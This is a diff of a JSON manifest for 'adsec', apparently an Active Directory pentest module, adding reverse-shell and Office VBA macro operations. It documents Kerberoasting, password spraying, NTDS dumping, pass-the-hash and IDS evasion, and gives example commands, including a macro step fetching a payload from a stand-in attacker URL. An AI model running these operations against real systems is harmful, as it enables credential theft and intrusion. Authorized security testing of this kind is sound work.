@@ -1,36 +1,52 @@
 {
   "name": "adsec",
-  "version": "1.0.0",
+  "version": "1.0.2",
   "category": "AD",
-  "description": "Active Directory security assessment: enumeration, Kerberoasting, AS-REP roasting, password spraying, BloodHound collection, vuln checks, and loot extraction — all in one module",
+  "description": "Active Directory security assessment: enumeration, Kerberoasting, AS-REP roasting, password spraying, BloodHound collection, vuln checks, and loot extraction \u2014 all in one module",
   "author": "0xb0rn3 | github.com/0xb0rn3",
   "executable": "python3 adsec.py",
-
-  "dependencies": ["python3"],
-
+  "dependencies": [
+    "python3"
+  ],
   "optional_dependencies": {
-    "nmap":            "SMB/LDAP/Kerberos NSE scripts - apt install nmap",
-    "smbclient":       "SMB share access - apt install smbclient",
-    "rpcclient":       "RPC enumeration - apt install samba-client",
-    "ldapsearch":      "LDAP queries - apt install ldap-utils",
-    "netexec":         "AD swiss army knife (formerly crackmapexec) - pipx install netexec",
-    "enum4linux-ng":   "SMB/RPC enumeration - pipx install enum4linux-ng",
-    "kerbrute":        "Kerberos user enum and spraying - go install github.com/ropnop/kerbrute@latest",
-    "smbmap":          "SMB share content discovery - pipx install smbmap",
+    "nmap": "SMB/LDAP/Kerberos NSE scripts - apt install nmap",
+    "smbclient": "SMB share access - apt install smbclient",
+    "rpcclient": "RPC enumeration - apt install samba-client",
+    "ldapsearch": "LDAP queries - apt install ldap-utils",
+    "netexec": "AD swiss army knife (formerly crackmapexec) - pipx install netexec",
+    "enum4linux-ng": "SMB/RPC enumeration - pipx install enum4linux-ng",
+    "kerbrute": "Kerberos user enum and spraying - go install github.com/ropnop/kerbrute@latest",
+    "smbmap": "SMB share content discovery - pipx install smbmap",
     "bloodhound-python": "Domain graph collection - pipx install bloodhound",
-    "impacket":        "Kerberoasting/AS-REP/secretsdump - pipx install impacket",
-    "ldap3":           "Pure-Python LDAP fallback - pip install ldap3",
-    "dnspython":       "DNS lookups - pip install dnspython",
-    "requests":        "HTTP probing for ADCS - pip install requests"
+    "impacket": "Kerberoasting/AS-REP/secretsdump - pipx install impacket",
+    "ldap3": "Pure-Python LDAP fallback - pip install ldap3",
+    "dnspython": "DNS lookups - pip install dnspython",
+    "requests": "HTTP probing for ADCS - pip install requests"
   },
-
   "help": {
     "description": "Active Directory pentest framework. Covers the full attack chain from unauthenticated discovery through credential-based enumeration, Kerberoasting, AS-REP roasting, password spraying with lockout awareness, BloodHound collection, common vuln checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota), and post-compromise loot. Pure-Python fallbacks via impacket/ldap3 mean it works even without external tools.",
-
     "parameters": {
       "operation": {
         "description": "Which AD assessment phase to run",
-        "options": ["discover", "users", "groups", "shares", "passpol", "kerberoast", "asreproast", "spray", "vulncheck", "bloodhound", "loot", "secrets", "exec", "privesc_check", "auto"],
+        "options": [
+          "discover",
+          "users",
+          "groups",
+          "shares",
+          "passpol",
+          "kerberoast",
+          "asreproast",
+          "spray",
+          "vulncheck",
+          "bloodhound",
+          "loot",
+          "secrets",
+          "exec",
+          "privesc_check",
+          "auto",
+          "shell",
+          "office_macros"
+        ],
         "default": "discover",
         "examples": [
           "discover    - DC fingerprint + domain identification (no creds needed)",
@@ -47,7 +63,8 @@
           "secrets     - Dump SAM/LSA/NTDS (admin or DA required)",
           "auto        - Run all safe operations with given context",
           "exec        - Execute a shell command on the target (creds required)",
-          "privesc_check - Audit Windows privesc vectors (unquoted paths, writable binaries, UAC, stored creds)"
+          "privesc_check - Audit Windows privesc vectors (unquoted paths, writable binaries, UAC, stored creds)",
+          "office_macros \u2014 generate VBA macro templates: download_exec, persistence, reverse_shell, etc."
         ]
       },
       "domain": {
@@ -96,7 +113,7 @@
         "required": false
       },
       "safe_spray": {
-        "description": "Lockout-aware spraying — read passpol first, leave 1-2 attempts buffer",
+        "description": "Lockout-aware spraying \u2014 read passpol first, leave 1-2 attempts buffer",
         "type": "boolean",
         "default": true
       },
@@ -118,7 +135,16 @@
       },
       "bloodhound_collection": {
         "description": "BloodHound collection method",
-        "options": ["Default", "All", "DCOnly", "Group", "LocalGroup", "Session", "ACL", "Trusts"],
+        "options": [
+          "Default",
+          "All",
+          "DCOnly",
+          "Group",
+          "LocalGroup",
+          "Session",
+          "ACL",
+          "Trusts"
+        ],
         "default": "Default"
       },
       "output_dir": {
@@ -135,153 +161,436 @@
         "description": "Comma-separated usernames to exclude from spray (avoid lockout)",
         "type": "string",
         "required": false
+      },
+      "lhost": {
+        "description": "Attacker IP for reverse shell LHOST (auto-detected from outbound interface if omitted)",
+        "type": "string",
+        "required": false
+      },
+      "lport": {
+        "description": "Listener port (default 4444)",
+        "type": "integer",
+        "required": false,
+        "default": 4444
+      },
+      "serve": {
+        "description": "true = interactive OnlyShell TUI (blocks), false = headless JSON mode for GUI",
+        "type": "boolean",
+        "required": false,
+        "default": true
+      },
+      "duration": {
+        "description": "Headless listen duration in seconds (serve=false only)",
+        "type": "integer",
+        "required": false,
+        "default": 120
+      },
+      "payload_type": {
+        "description": "Payload type: bash_tcp, python3, powershell_b64, all, etc. (default: powershell_b64 for Windows target)",
+        "type": "string",
+        "required": false,
+        "default": "powershell_b64"
+      },
+      "macro_type": {
+        "description": "Macro template: download_exec|hidden_cmd_exec|persistence|pwsh_cmd|reverse_shell|all",
+        "type": "string",
+        "required": false,
+        "default": "all"
+      },
+      "payload_url": {
+        "description": "Payload URL for download_exec / hidden_cmd_exec macros",
+        "type": "string",
+        "required": false
+      },
+      "rev_url": {
+        "description": "Reverse PS1 URL for reverse_shell macro",
+        "type": "string",
+        "required": false
+      },
+      "reg_path": {
+        "description": "VBS path for persistence macro",
+        "type": "string",
+        "required": false
+      },
+      "ps_command": {
+        "description": "PowerShell one-liner for pwsh_cmd macro",
+        "type": "string",
+        "required": false
       }
     },
-
     "examples": [
       {
         "description": "Unauthenticated DC discovery + fingerprint",
-        "commands": ["use adsec", "set operation discover", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation discover",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "AS-REP roast all users in a list (no creds needed)",
-        "commands": ["use adsec", "set operation asreproast", "set domain corp.local", "set userlist /tmp/users.txt", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation asreproast",
+          "set domain corp.local",
+          "set userlist /tmp/users.txt",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Password spray with lockout safety",
-        "commands": ["use adsec", "set operation spray", "set domain corp.local", "set userlist users.txt", "set single_password Welcome2024!", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation spray",
+          "set domain corp.local",
+          "set userlist users.txt",
+          "set single_password Welcome2024!",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Kerberoast all SPN-bearing accounts",
-        "commands": ["use adsec", "set operation kerberoast", "set domain corp.local", "set username analyst", "set password 'P@ss123'", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation kerberoast",
+          "set domain corp.local",
+          "set username analyst",
+          "set password 'P@ss123'",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Full BloodHound collection with creds",
-        "commands": ["use adsec", "set operation bloodhound", "set domain corp.local", "set username analyst", "set password 'P@ss123'", "set bloodhound_collection All", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation bloodhound",
+          "set domain corp.local",
+          "set username analyst",
+          "set password 'P@ss123'",
+          "set bloodhound_collection All",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Run every safe operation with a low-priv account",
-        "commands": ["use adsec", "set operation auto", "set domain corp.local", "set username analyst", "set password 'P@ss123'", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation auto",
+          "set domain corp.local",
+          "set username analyst",
+          "set password 'P@ss123'",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Vuln scan only (Zerologon, PetitPotam, NoPac)",
-        "commands": ["use adsec", "set operation vulncheck", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation vulncheck",
+          "run 192.168.1.50"
+        ]
       },
       {
         "description": "Pass-the-hash NTDS dump (DA required)",
-        "commands": ["use adsec", "set operation secrets", "set domain corp.local", "set username admin", "set hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "run 192.168.1.50"]
+        "commands": [
+          "use adsec",
+          "set operation secrets",
+          "set domain corp.local",
+          "set username admin",
+          "set hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+          "run 192.168.1.50"
+        ]
+      },
+      {
+        "description": "Start reverse shell handler (auto-deliver via WMI if creds provided)",
+        "commands": [
+          "use adsec",
+          "set operation shell",
+          "set lhost 10.10.10.10",
+          "set lport 4444",
+          "run <target>"
+        ]
+      },
+      {
+        "description": "Generate all Office VBA macro templates for initial access",
+        "commands": [
+          "use adsec",
+          "set operation office_macros",
+          "set payload_url http://10.10.10.10/payload.exe",
+          "run <dc-ip>"
+        ]
       }
     ],
-
     "operations": {
-      "discover":     "DC fingerprint, domain SID, OS detection, NetBIOS, anonymous SMB/LDAP, null session test, DNS records",
-      "users":        "Enumerate domain users via LDAP (auth) / SAMR RID brute / Kerberos pre-auth probing (unauth)",
-      "groups":       "Enumerate domain groups, members, nested membership, Domain Admins, Enterprise Admins",
-      "shares":       "Map all SMB shares, test READ/WRITE per share, list root contents of accessible shares",
-      "passpol":      "Pull domain password policy: lockout threshold, observation window, complexity, min length",
-      "kerberoast":   "Discover SPNs via LDAP and request TGS for each — output hashcat-format hashes",
-      "asreproast":   "Probe users for DONT_REQUIRE_PREAUTH flag and dump AS-REP hashes (offline crackable)",
-      "spray":        "Lockout-aware credential spraying — checks passpol first, sprays single password across all users",
-      "vulncheck":    "Zerologon CVE-2020-1472, PetitPotam, NoPac CVE-2021-42278/42287, MachineAccountQuota, ADCS detection",
-      "bloodhound":   "Run bloodhound-python collection or pure-Python LDAP collection — outputs BH-compatible JSON zip",
-      "loot":         "Search readable shares for cred files: web.config, unattend.xml, GPP groups.xml (cpassword), .kdbx, .ssh keys",
-      "secrets":      "Dump SAM/LSA/NTDS via secretsdump — domain admin or local admin required",
-      "exec":         "Run arbitrary command on target via WMI (impacket-wmiexec or pure-impacket native fallback)",
+      "discover": "DC fingerprint, domain SID, OS detection, NetBIOS, anonymous SMB/LDAP, null session test, DNS records",
+      "users": "Enumerate domain users via LDAP (auth) / SAMR RID brute / Kerberos pre-auth probing (unauth)",
+      "groups": "Enumerate domain groups, members, nested membership, Domain Admins, Enterprise Admins",
+      "shares": "Map all SMB shares, test READ/WRITE per share, list root contents of accessible shares",
+      "passpol": "Pull domain password policy: lockout threshold, observation window, complexity, min length",
+      "kerberoast": "Discover SPNs via LDAP and request TGS for each \u2014 output hashcat-format hashes",
+      "asreproast": "Probe users for DONT_REQUIRE_PREAUTH flag and dump AS-REP hashes (offline crackable)",
+      "spray": "Lockout-aware credential spraying \u2014 checks passpol first, sprays single password across all users",
+      "vulncheck": "Zerologon CVE-2020-1472, PetitPotam, NoPac CVE-2021-42278/42287, MachineAccountQuota, ADCS detection",
+      "bloodhound": "Run bloodhound-python collection or pure-Python LDAP collection \u2014 outputs BH-compatible JSON zip",
+      "loot": "Search readable shares for cred files: web.config, unattend.xml, GPP groups.xml (cpassword), .kdbx, .ssh keys",
+      "secrets": "Dump SAM/LSA/NTDS via secretsdump \u2014 domain admin or local admin required",
+      "exec": "Run arbitrary command on target via WMI (impacket-wmiexec or pure-impacket native fallback)",
       "privesc_check": "Drop+run PowerShell privesc auditor: unquoted services, writable binaries, AlwaysInstallElevated, UAC, token privs, stored creds, writable PATH, autoruns",
-      "auto":         "Pipeline: discover → vulncheck → users → groups → shares → passpol → asreproast (+ kerberoast/bloodhound/privesc_check if creds) → loot"
+      "auto": "Pipeline: discover \u2192 vulncheck \u2192 users \u2192 groups \u2192 shares \u2192 passpol \u2192 asreproast (+ kerberoast/bloodhound/privesc_check if creds) \u2192 loot"
     },
-
     "safety_features": [
-      "🔒 Lockout-aware spraying — pulls passpol first, leaves 2-attempt buffer below threshold",
-      "🔒 exclude_users supports avoiding krbtgt/admin/Guest from spray attempts",
-      "🔒 Connection pooling and rate-limiting prevent IDS triggers",
-      "🔒 Pure-Python fallbacks mean no need to install dozens of tools",
-      "🔒 All credential operations log to output_dir for audit trail"
+      "\ud83d\udd12 Lockout-aware spraying \u2014 pulls passpol first, leaves 2-attempt buffer below threshold",
+      "\ud83d\udd12 exclude_users supports avoiding krbtgt/admin/Guest from spray attempts",
+      "\ud83d\udd12 Connection pooling and rate-limiting prevent IDS triggers",
+      "\ud83d\udd12 Pure-Python fallbacks mean no need to install dozens of tools",
+      "\ud83d\udd12 All credential operations log to output_dir for audit trail"
     ],
-
     "output_structure": {
       "domain_info": {
-        "domain":         "FQDN of the domain",
-        "netbios":        "NetBIOS domain name",
-        "domain_sid":     "Domain SID (S-1-5-21-...)",
-        "forest":         "Forest FQDN",
-        "dc_hostname":    "Domain controller hostname",
-        "dc_ip":          "Domain controller IP",
-        "os":             "DC operating system",
-        "smb_signing":    "Required / Optional / Disabled",
-        "smb_dialect":    "SMB1 / SMB2 / SMB3",
+        "domain": "FQDN of the domain",
+        "netbios": "NetBIOS domain name",
+        "domain_sid": "Domain SID (S-1-5-21-...)",
+        "forest": "Forest FQDN",
+        "dc_hostname": "Domain controller hostname",
+        "dc_ip": "Domain controller IP",
+        "os": "DC operating system",
+        "smb_signing": "Required / Optional / Disabled",
+        "smb_dialect": "SMB1 / SMB2 / SMB3",
         "ldap_anonymous": "Anonymous LDAP bind allowed",
-        "smb_anonymous":  "Anonymous SMB session allowed",
+        "smb_anonymous": "Anonymous SMB session allowed",
         "functional_level": "Domain functional level"
       },
-      "users":     "Array of {sid, rid, username, full_name, description, last_logon, pwd_last_set, kerberos_preauth, spn[], admin_count, enabled, locked, disabled}",
-      "groups":    "Array of {sid, name, members[], description, type}",
-      "shares":    "Array of {name, type, comment, readable, writable, root_listing[]}",
-      "passpol":   "{min_length, complexity, lockout_threshold, lockout_window, observation_window, max_age, min_age, history}",
+      "users": "Array of {sid, rid, username, full_name, description, last_logon, pwd_last_set, kerberos_preauth, spn[], admin_count, enabled, locked, disabled}",
+      "groups": "Array of {sid, name, members[], description, type}",
+      "shares": "Array of {name, type, comment, readable, writable, root_listing[]}",
+      "passpol": "{min_length, complexity, lockout_threshold, lockout_window, observation_window, max_age, min_age, history}",
       "kerberoast": "Array of {username, spn, hash} - hashcat $krb5tgs$23$ format",
       "asreproast": "Array of {username, hash} - hashcat $krb5asrep$23$ format",
       "spray_results": "Array of {username, password, success, error}",
       "vulnerabilities": "Array of {cve, name, vulnerable, evidence, severity}",
-      "bloodhound":   "{output_zip, computers, users, groups, sessions, edges}",
-      "loot":         "Array of {share, path, type, size, content_preview, severity}",
-      "secrets":      "{sam[], lsa[], ntds[], output_files[]}"
+      "bloodhound": "{output_zip, computers, users, groups, sessions, edges}",
+      "loot": "Array of {share, path, type, size, content_preview, severity}",
+      "secrets": "{sam[], lsa[], ntds[], output_files[]}"
     },
-
     "notes": [
-      "⚠️  AUTHORIZATION REQUIRED: Only run against systems you own or have explicit written permission to test",
-      "⚠️  Spraying and Kerberoasting can trigger SIEM alerts — coordinate with blue team",
-      "⚠️  AS-REP roasting only works on users with DONT_REQUIRE_PREAUTH set (rare but valuable)",
-      "⚠️  secretsdump requires DA or local admin — destructive to victim's tradecraft if misused",
-      "💡 Start with 'discover' to understand the domain before running anything authenticated",
-      "💡 Use 'vulncheck' early — Zerologon = instant DA on unpatched DCs",
-      "💡 BloodHound collection with low-priv creds reveals all attack paths to DA",
-      "💡 'auto' mode runs the full safe pipeline — fastest path from zero to assessment report",
-      "💡 Save hashes from kerberoast/asreproast and crack offline with hashcat -m 13100 / -m 18200",
-      "🔐 Hashes are written to output_dir with timestamps — never logged to stdout"
+      "\u26a0\ufe0f  AUTHORIZATION REQUIRED: Only run against systems you own or have explicit written permission to test",
+      "\u26a0\ufe0f  Spraying and Kerberoasting can trigger SIEM alerts \u2014 coordinate with blue team",
+      "\u26a0\ufe0f  AS-REP roasting only works on users with DONT_REQUIRE_PREAUTH set (rare but valuable)",
+      "\u26a0\ufe0f  secretsdump requires DA or local admin \u2014 destructive to victim's tradecraft if misused",
+      "\ud83d\udca1 Start with 'discover' to understand the domain before running anything authenticated",
+      "\ud83d\udca1 Use 'vulncheck' early \u2014 Zerologon = instant DA on unpatched DCs",
+      "\ud83d\udca1 BloodHound collection with low-priv creds reveals all attack paths to DA",
+      "\ud83d\udca1 'auto' mode runs the full safe pipeline \u2014 fastest path from zero to assessment report",
+      "\ud83d\udca1 Save hashes from kerberoast/asreproast and crack offline with hashcat -m 13100 / -m 18200",
+      "\ud83d\udd10 Hashes are written to output_dir with timestamps \u2014 never logged to stdout"
     ],
-
     "legal_disclaimer": "This tool is for authorized security testing only. Unauthorized AD enumeration, credential attacks, or domain controller exploitation may violate computer fraud laws including CFAA in the US. Always obtain explicit written authorization."
   },
-
   "inputs": {
-    "operation":             {"type": "string",  "default": "discover", "required": false},
-    "domain":                {"type": "string",  "default": "",         "required": false},
-    "username":              {"type": "string",  "default": "",         "required": false},
-    "password":              {"type": "string",  "default": "",         "required": false},
-    "hash":                  {"type": "string",  "default": "",         "required": false},
-    "kerberos":              {"type": "boolean", "default": false,      "required": false},
-    "dc_ip":                 {"type": "string",  "default": "",         "required": false},
-    "userlist":              {"type": "string",  "default": "",         "required": false},
-    "passlist":              {"type": "string",  "default": "",         "required": false},
-    "single_password":       {"type": "string",  "default": "",         "required": false},
-    "safe_spray":            {"type": "boolean", "default": true,       "required": false},
-    "ldap_port":             {"type": "number",  "default": 389,        "required": false},
-    "threads":               {"type": "number",  "default": 20,         "required": false},
-    "timeout":               {"type": "number",  "default": 30,         "required": false},
-    "bloodhound_collection": {"type": "string",  "default": "Default",  "required": false},
-    "output_dir":            {"type": "string",  "default": "./adsec-loot", "required": false},
-    "rid_max":               {"type": "number",  "default": 4000,       "required": false},
-    "exclude_users":         {"type": "string",  "default": "",         "required": false},
-    "command":               {"type": "string",  "default": "whoami /all", "required": false}
+    "operation": {
+      "type": "string",
+      "default": "discover",
+      "required": false
+    },
+    "domain": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "username": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "password": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "hash": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "kerberos": {
+      "type": "boolean",
+      "default": false,
+      "required": false
+    },
+    "dc_ip": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "userlist": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "passlist": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "single_password": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "safe_spray": {
+      "type": "boolean",
+      "default": true,
+      "required": false
+    },
+    "ldap_port": {
+      "type": "number",
+      "default": 389,
+      "required": false
+    },
+    "threads": {
+      "type": "number",
+      "default": 20,
+      "required": false
+    },
+    "timeout": {
+      "type": "number",
+      "default": 30,
+      "required": false
+    },
+    "bloodhound_collection": {
+      "type": "string",
+      "default": "Default",
+      "required": false
+    },
+    "output_dir": {
+      "type": "string",
+      "default": "./adsec-loot",
+      "required": false
+    },
+    "rid_max": {
+      "type": "number",
+      "default": 4000,
+      "required": false
+    },
+    "exclude_users": {
+      "type": "string",
+      "default": "",
+      "required": false
+    },
+    "command": {
+      "type": "string",
+      "default": "whoami /all",
+      "required": false
+    },
+    "lhost": {
+      "type": "string",
+      "description": "Attacker IP for shell LHOST",
+      "required": false
+    },
+    "lport": {
+      "type": "integer",
+      "description": "Shell listener port",
+      "required": false,
+      "default": 4444
+    },
+    "serve": {
+      "type": "boolean",
+      "description": "Interactive TUI (true) or headless JSON (false)",
+      "required": false,
+      "default": true
+    },
+    "duration": {
+      "type": "integer",
+      "description": "Headless listen duration (seconds)",
+      "required": false,
+      "default": 120
+    },
+    "payload_type": {
+      "type": "string",
+      "description": "Reverse shell payload type",
+      "required": false,
+      "default": "powershell_b64"
+    },
+    "macro_type": {
+      "type": "string",
+      "required": false,
+      "default": "all"
+    },
+    "payload_url": {
+      "type": "string",
+      "required": false
+    },
+    "rev_url": {
+      "type": "string",
+      "required": false
+    },
+    "reg_path": {
+      "type": "string",
+      "required": false
+    },
+    "ps_command": {
+      "type": "string",
+      "required": false
+    }
   },
-
   "outputs": {
-    "domain_info":     {"type": "object", "description": "Discovered domain identity and DC properties"},
-    "users":           {"type": "array",  "description": "Enumerated user accounts"},
-    "groups":          {"type": "array",  "description": "Enumerated groups"},
-    "shares":          {"type": "array",  "description": "SMB share inventory with permissions"},
-    "passpol":         {"type": "object", "description": "Domain password policy"},
-    "kerberoast":      {"type": "array",  "description": "Kerberoastable accounts and TGS hashes"},
-    "asreproast":      {"type": "array",  "description": "AS-REP roastable accounts and AS-REP hashes"},
-    "spray_results":   {"type": "array",  "description": "Spray attempt outcomes"},
-    "vulnerabilities": {"type": "array",  "description": "Detected AD vulnerabilities"},
-    "bloodhound":      {"type": "object", "description": "BloodHound output zip path and statistics"},
-    "loot":            {"type": "array",  "description": "Sensitive files discovered in shares"},
-    "secrets":         {"type": "object", "description": "Dumped SAM/LSA/NTDS hashes"},
-    "exec":            {"type": "object", "description": "Remote command output: {returncode, output, stderr, error}"},
-    "privesc":         {"type": "object", "description": "Privesc audit: {findings[], results{}, raw_file}"}
+    "domain_info": {
+      "type": "object",
+      "description": "Discovered domain identity and DC properties"
+    },
+    "users": {
+      "type": "array",
+      "description": "Enumerated user accounts"
+    },
+    "groups": {
+      "type": "array",
+      "description": "Enumerated groups"
+    },
+    "shares": {
+      "type": "array",
+      "description": "SMB share inventory with permissions"
+    },
+    "passpol": {
+      "type": "object",
+      "description": "Domain password policy"
+    },
+    "kerberoast": {
+      "type": "array",
+      "description": "Kerberoastable accounts and TGS hashes"
+    },
+    "asreproast": {
+      "type": "array",
+      "description": "AS-REP roastable accounts and AS-REP hashes"
+    },
+    "spray_results": {
+      "type": "array",
+      "description": "Spray attempt outcomes"
+    },
+    "vulnerabilities": {
+      "type": "array",
+      "description": "Detected AD vulnerabilities"
+    },
+    "bloodhound": {
+      "type": "object",
+      "description": "BloodHound output zip path and statistics"
+    },
+    "loot": {
+      "type": "array",
+      "description": "Sensitive files discovered in shares"
+    },
+    "secrets": {
+      "type": "object",
+      "description": "Dumped SAM/LSA/NTDS hashes"
+    },
+    "exec": {
+      "type": "object",
+      "description": "Remote command output: {returncode, output, stderr, error}"
+    },
+    "privesc": {
+      "type": "object",
+      "description": "Privesc audit: {findings[], results{}, raw_file}"
+    }
   },
-
   "timeout": 1800,
   "concurrent": true
 }
